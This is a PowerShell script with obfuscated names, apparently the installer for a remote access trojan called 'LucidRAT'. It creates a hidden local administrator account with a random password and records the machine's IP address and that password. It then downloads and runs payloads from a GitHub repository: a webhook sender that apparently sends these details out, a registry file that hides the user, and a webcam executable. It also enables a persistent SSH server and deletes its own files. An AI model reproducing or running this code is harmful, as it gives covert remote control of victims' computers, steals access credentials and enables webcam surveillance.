function RpLGWiUsIy {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
}

function geIwCZloBx {
    [CmdletBinding()]
    param (
        [string] $sqbXFdLvyw,
        [securestring] $CBFXIYeWPR
    )
    begin {
    }
    process {
        New-LocalUser "$sqbXFdLvyw" -Password $CBFXIYeWPR -FullName "$sqbXFdLvyw" -Description "Temporary local admin"
        Write-Verbose "$sqbXFdLvyw local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$sqbXFdLvyw"
        Write-Verbose "$sqbXFdLvyw added to the local administrator group"
    }
    end {
    }
}

Remove-LocalUser -Name "lucidrat"
$sqbXFdLvyw = "lucidrat"
$DCilJFugpP = RpLGWiUsIy
$CBFXIYeWPR = (ConvertTo-SecureString $DCilJFugpP -AsPlainText -Force)
geIwCZloBx -sqbXFdLvyw $sqbXFdLvyw -CBFXIYeWPR $CBFXIYeWPR
$FrNAQBWSnJ = RpLGWiUsIy
$qsQBioVOkY = "$env:temp\$FrNAQBWSnJ"
$NyZnoLKCIs = Get-Location
$CRYnrkaDbe = "$env:UserName.rat"
$PEBgxuJUfd = Get-Content lawFvVTikZ.txt | Out-String
$AhdjktGyiZ = (
    Get-NetIPConfiguration |
    Where-Object {
        $_.IPv4DefaultGateway -ne $null -and
        $_.NetAdapter.Status -ne "Disconnected"
    }
).IPv4Address.IPAddress
Add-Content -Path "$NyZnoLKCIs/GiLqXiexKP.cmd" -Value "@echo off"
Add-Content -Path $CRYnrkaDbe -Value $AhdjktGyiZ
Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP
Add-Content -Path $CRYnrkaDbe -Value $env:temp
Add-Content -Path $CRYnrkaDbe -Value $NyZnoLKCIs
$VquGXMYQWi = RpLGWiUsIy
Invoke-WebRequest -Uri raw.githubusercontent.com/Lucidif3r/LucidRAT/main/payloads/send-to-webhook.cmd -OutFile "$VquGXMYQWi.cmd"
Invoke-Expression "./$VquGXMYQWi.cmd $PEBgxuJUfd"
mkdir $qsQBioVOkY
Set-Location $qsQBioVOkY
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
$irlpLDVsMf = RpLGWiUsIy
Invoke-WebRequest -Uri raw.githubusercontent.com/Lucidif3r/LucidRAT/main/payloads/hide-user.reg -OutFile "$irlpLDVsMf.reg"
$gdOjqHVNDKeg = RpLGWiUsIy
Invoke-WebRequest -Uri raw.githubusercontent.com/Lucidif3r/LucidRAT/main/payloads/confirm-reg.vbs -OutFile "$gdOjqHVNDKeg.vbs"
Invoke-Expression "./$irlpLDVsMf.reg"; Invoke-Expression "./$gdOjqHVNDKeg.vbs"
mkdir $env:temp/bNOEXCxyVp
Set-Location $env:temp/bNOEXCxyVp
Invoke-WebRequest -Uri raw.githubusercontent.com/Lucidif3r/LucidRAT/main/payloads/webcam.exe -OutFile "UaAIVKpYhR.exe"
$grOzVTtUmS = RpLGWiUsIy
Invoke-WebRequest -Uri raw.githubusercontent.com/Lucidif3r/LucidRAT/main/payloads/confirm-cam.vbs -OutFile "$grOzVTtUmS.vbs"
./UaAIVKpYhR.exe; Invoke-Expression "./$grOzVTtUmS.vbs"
Set-Location C:\Users
attrib +h +s +r lucidrat
Set-Location $NyZnoLKCIs
Remove-Item $CRYnrkaDbe
Remove-Item "$VquGXMYQWi.cmd"
Remove-Item lawFvVTikZ.txt
Remove-Item KFPGaEYdcz.ps1
